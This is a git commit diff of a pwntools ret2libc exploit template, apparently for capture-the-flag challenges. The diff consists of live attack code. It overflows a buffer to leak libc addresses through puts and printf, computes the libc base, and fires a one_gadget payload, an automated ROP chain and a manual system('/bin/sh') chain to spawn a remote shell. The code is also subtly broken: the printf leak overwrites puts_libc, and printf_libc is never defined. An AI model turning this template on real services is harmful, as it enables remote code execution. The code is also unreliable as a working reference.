7c1020fdf4bf944ff0af205a44c84809271f7d9f
absurdtiger <86316626+absurdtiger@users.noreply.github.com>
2022-05-19 17:14:12 +0800

    Update ret2libc.py

--- pwn/ret2libc.py
+++ pwn/ret2libc.py
@@ -5,45 +5,74 @@ context.log_level='debug'
 BINARY = "./binary"
 URL = "someplace.com"
 PORT = 1337
-BUF_OFFSET = 0
+RIP_OFFSET = 0
 PROMPT = "Input: "
 
-### script ###
+### initiate ###
 elf = context.binary = ELF(BINARY)
 rop = ROP(BINARY)
 p = remote(URL, PORT)
 
-payload1 = flat(
-        b"A"*BUF_OFFSET,
+### leak puts ###
+p.sendlineafter(PROMPT, flat(
+        b"A"*RIP_OFFSET,
 	rop.ret.address,
         rop.rdi.address, elf.got['puts'],
         elf.plt['puts'],
         elf.symbols['main']
-)
-
-p.recvuntil(PROMPT)
-p.sendline(payload1)
-p.recvline() # if the thing sends a newline
-
+))
+p.recvline() # program might send multiple lines of nonsense
 puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
-log.info("libc puts is: " + hex(puts_libc))
 
+### leak printf ###
+p.sendlineafter(PROMPT, flat(
+        b"A"*RIP_OFFSET,
+	rop.ret.address,
+        rop.rdi.address, elf.got['printf'],
+        elf.plt['printf'],
+        elf.symbols['main']
+))
+p.recvline() # program might send multiple lines of nonsense
+puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
+
+log.success("libc puts is: " + hex(puts_libc))
+log.success("libc printf is: " + hex(printf_libc))
 #p.interactive()
 
 ### DECLARE ###
 libc = ELF('./libc.so.6')
+
+libc.address = puts_libc - libc.symbols.puts
+log.success("libc base is " + hex(libc.address))
+
+#================================================
+
+### one_gadget ###
 one_gadget = 0xdeadbeef
+execve = libc.address +one_gadget
+p.sendlineafter(PROMPT, flat(
+	b"A"*RIP_OFFSET,
+	execve
+))
 
-### script ###
-libc_base = puts_libc - libc.symbols['puts']
-log.info("libc base is: " + hex(libc_base))
-syscall = libc_base + one_gadget
-payload2 = flat(
-	b"A"*BUF_OFFSET,
-	syscall
-)
+### automated ROP chain ###
+rop = ROP([elf, libc])
+rop.system(next(libc.search(b"/bin/sh")))
+p.sendlineafter(PROMPT, flat(
+	"A"*RIP_OFFSET,
+	rop.ret.address,
+	rop.chain()
+))
 
-p.recvuntil(PROMPT)
-p.sendline(payload2)
+### kind of manual system call with binsh declared ###
+binsh = libc.address + 0xdeadbeef 
+#~$ ROPgadget --binary ./libc.so.6 --string "/bin/sh"
+p.sendlineafter(PROMPT, flat(
+	b"A"*RIP_OFFSET,
+	rop.rdi.address,
+	binsh,
+	rop.ret.address,
+	libc.symbols.system
+))
 
 p.interactive()
